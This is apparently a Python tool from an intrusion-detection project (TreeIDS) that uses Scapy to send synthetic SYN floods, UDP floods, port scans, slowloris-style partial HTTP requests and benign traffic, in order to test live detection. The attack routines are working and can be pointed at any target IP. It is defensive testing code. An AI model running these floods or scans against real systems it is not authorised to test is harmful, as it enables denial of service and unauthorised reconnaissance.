"""
TreeIDS Interactive Attack Simulator Suite (Phase 2)
Generates targeted synthetic cyber attacks (TCP SYN Flood, Port Scanning,
Application DoS, UDP Floods) and baseline network traffic using Scapy
to validate live streaming intrusion detection.
"""

import sys
import time
import random
import argparse
from typing import List

try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw, send, conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class AttackSimulator:
    def __init__(self, target_ip: str = "127.0.0.1", iface: str = None):
        self.target_ip = target_ip
        self.iface = iface
        if not SCAPY_AVAILABLE:
            print("[!] Error: Scapy is required to inject live packets. Run: pip install scapy")

    def run_syn_flood(self, target_port: int = 80, count: int = 200, delay: float = 0.005) -> None:
        """Simulates a high-rate Volumetric TCP SYN Flood targeting a single service."""
        print(f"\n[*] Launching TCP SYN Flood -> {self.target_ip}:{target_port} ({count} packets, {delay*1000}ms delay)...")
        for i in range(count):
            sport = random.randint(1024, 65535)
            seq = random.randint(10000, 999999)
            pkt = IP(dst=self.target_ip) / TCP(sport=sport, dport=target_port, flags="S", seq=seq)
            send(pkt, verbose=False, iface=self.iface)
            if delay > 0:
                time.sleep(delay)
            if (i + 1) % 50 == 0 or i == count - 1:
                print(f"    [->] Sent {i + 1}/{count} SYN packets...")
        print("[+] TCP SYN Flood simulation complete.\n")

    def run_port_scan(self, ports: List[int] = None, delay: float = 0.02) -> None:
        """Simulates Network Service Reconnaissance / Port Scanning across a port range."""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 8080, 8443]
        
        print(f"\n[*] Launching Port Scan Reconnaissance -> {self.target_ip} ({len(ports)} target ports)...")
        sport = random.randint(30000, 60000)
        for i, port in enumerate(ports):
            pkt = IP(dst=self.target_ip) / TCP(sport=sport, dport=port, flags="S", seq=1000 + i)
            send(pkt, verbose=False, iface=self.iface)
            time.sleep(delay)
            print(f"    [->] Probed port {port}...")
        print("[+] Port Scan simulation complete.\n")

    def run_udp_flood(self, target_port: int = 53, count: int = 150, delay: float = 0.005) -> None:
        """Simulates a Volumetric UDP Burst."""
        print(f"\n[*] Launching UDP Flood -> {self.target_ip}:{target_port} ({count} packets)...")
        payload = b"X" * 256
        for i in range(count):
            sport = random.randint(1024, 65535)
            pkt = IP(dst=self.target_ip) / UDP(sport=sport, dport=target_port) / Raw(load=payload)
            send(pkt, verbose=False, iface=self.iface)
            if delay > 0:
                time.sleep(delay)
            if (i + 1) % 50 == 0 or i == count - 1:
                print(f"    [->] Sent {i + 1}/{count} UDP datagrams...")
        print("[+] UDP Flood simulation complete.\n")

    def run_slowloris_simulation(self, target_port: int = 80, connections: int = 20, duration_sec: int = 5) -> None:
        """Simulates Application-Layer Low-and-Slow Connection Exhaustion."""
        print(f"\n[*] Launching Low-and-Slow HTTP Exhaustion -> {self.target_ip}:{target_port} ({connections} sessions, {duration_sec}s)...")
        for i in range(connections):
            sport = random.randint(40000, 60000)
            # SYN -> handshake initiate
            syn_pkt = IP(dst=self.target_ip) / TCP(sport=sport, dport=target_port, flags="S", seq=5000 + i)
            send(syn_pkt, verbose=False, iface=self.iface)
            
            # Partial HTTP request header
            partial_http = f"GET /?id={random.randint(100, 999)} HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\n"
            data_pkt = IP(dst=self.target_ip) / TCP(sport=sport, dport=target_port, flags="PA", seq=5001 + i) / Raw(load=partial_http.encode())
            send(data_pkt, verbose=False, iface=self.iface)
            time.sleep(0.05)
        
        print(f"    [->] Holding {connections} connections open across time window...")
        time.sleep(duration_sec)
        print("[+] Slowloris simulation complete.\n")

    def run_benign_traffic(self, count: int = 15) -> None:
        """Simulates clean baseline HTTP/DNS traffic."""
        print(f"\n[*] Simulating Benign Baseline Network Communication ({count} sessions)...")
        for i in range(count):
            sport = random.randint(40000, 65000)
            dport = random.choice([80, 443, 53, 8080])
            pkt = IP(dst=self.target_ip) / TCP(sport=sport, dport=dport, flags="PA", seq=20000 + i) / Raw(load=b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
            send(pkt, verbose=False, iface=self.iface)
            time.sleep(0.1)
        print("[+] Benign baseline simulation complete.\n")


def interactive_menu():
    print("=" * 60)
    print("   TreeIDS Live Attack Simulation Suite (Phase 2)   ")
    print("=" * 60)
    print("  1. TCP SYN Flood (Volumetric DoS - T1498)")
    print("  2. Network Port Scan (Reconnaissance / Discovery - T1046)")
    print("  3. UDP Volumetric Burst (DoS)")
    print("  4. Low-and-Slow HTTP Exhaustion (Application DoS - T1499.002)")
    print("  5. Benign Baseline Network Traffic")
    print("  0. Exit")
    print("-" * 60)


def main():
    parser = argparse.ArgumentParser(description="TreeIDS Synthetic Network Attack Simulator")
    parser.add_argument("--attack", choices=["syn_flood", "port_scan", "udp_flood", "slowloris", "benign"], help="Attack type to execute")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target port for single-port attacks (default: 80)")
    parser.add_argument("--count", type=int, default=100, help="Packet count")
    parser.add_argument("--iface", default=None, help="Network interface to bind (default: default interface)")
    
    args = parser.parse_args()
    sim = AttackSimulator(target_ip=args.target, iface=args.iface)

    if args.attack:
        if args.attack == "syn_flood":
            sim.run_syn_flood(target_port=args.port, count=args.count)
        elif args.attack == "port_scan":
            sim.run_port_scan()
        elif args.attack == "udp_flood":
            sim.run_udp_flood(target_port=args.port, count=args.count)
        elif args.attack == "slowloris":
            sim.run_slowloris_simulation(target_port=args.port)
        elif args.attack == "benign":
            sim.run_benign_traffic(count=args.count)
        return

    # Interactive mode
    while True:
        interactive_menu()
        choice = input("Select an attack vector to simulate [0-5]: ").strip()
        
        if choice == "1":
            sim.run_syn_flood(target_port=80, count=150)
        elif choice == "2":
            sim.run_port_scan()
        elif choice == "3":
            sim.run_udp_flood(target_port=53, count=100)
        elif choice == "4":
            sim.run_slowloris_simulation(target_port=80, connections=15, duration_sec=3)
        elif choice == "5":
            sim.run_benign_traffic(count=10)
        elif choice == "0":
            print("[+] Exiting Attack Simulator.")
            break
        else:
            print("[!] Invalid option. Please try again.")


if __name__ == "__main__":
    main()
